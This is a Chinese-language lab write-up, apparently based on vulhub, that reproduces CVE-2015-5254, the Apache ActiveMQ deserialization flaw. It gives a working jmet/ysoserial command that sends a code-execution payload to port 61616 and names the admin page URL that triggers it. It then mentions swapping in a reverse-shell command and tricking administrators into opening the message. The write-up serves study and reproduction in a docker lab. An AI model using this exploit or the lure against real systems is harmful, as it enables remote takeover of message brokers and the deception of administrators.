# （CVE-2015-5254）ActiveMQ 反序列化漏洞

> 原文：[https://www.zhihuifly.com/t/topic/2800](https://www.zhihuifly.com/t/topic/2800)

# （CVE-2015-5254）ActiveMQ 反序列化漏洞

## 一、漏洞简介

Apache ActiveMQ 5.13.0之前5.x版本中存在安全漏洞，该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java Message Service(JMS)ObjectMessage对象利用该漏洞执行任意代码。

## 二、漏洞影响

Apache ActiveMQ 5.13.0之前的5.x版本

## 三、复现过程

漏洞利用过程如下：

1.  构造（可以使用ysoserial）可执行命令的序列化对象
2.  作为一个消息，发送给目标61616端口
3.  访问web管理页面，读取消息，触发漏洞

使用[jmet](https://github.com/ianxtianxt/jmet)进行漏洞利用。首先下载jmet的jar文件，并在同目录下创建一个external文件夹（否则可能会爆文件夹不存在的错误）。

jmet原理是使用ysoserial生成Payload并发送（其jar内自带ysoserial，无需再自己下载），所以我们需要在ysoserial是gadget中选择一个可以使用的，比如ROME。

执行：

```
java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y "touch /tmp/success" -Yp ROME your-ip 61616 
```

![image](img/c20d9a1e7d2015b6c24574dde28fcf54.png)

此时会给目标ActiveMQ添加一个名为event的队列，我们可以通过`http://your-ip:8161/admin/browse.jsp?JMSDestination=event`看到这个队列中所有消息：

![image](img/1a4d3b3d48c49d11126c045bfdf1d470.png)

点击查看这条消息即可触发命令执行，此时进入容器`docker-compose exec activemq bash`，可见/tmp/success已成功创建，说明漏洞利用成功：

![image](img/ac0d403e8d06368e45ff89daa9431aff.png)

将命令替换成弹shell语句再利用：

![image](img/bdca1ff0222f8e1d12b4b36ee75e500b.png)

值得注意的是，通过web管理页面访问消息并触发漏洞这个过程需要管理员权限。在没有密码的情况下，我们可以诱导管理员访问我们的链接以触发，或者伪装成其他合法服务需要的消息，等待客户端访问的时候触发。

## 参考链接

> https://vulhub.org/#/environments/activemq/CVE-2015-5254/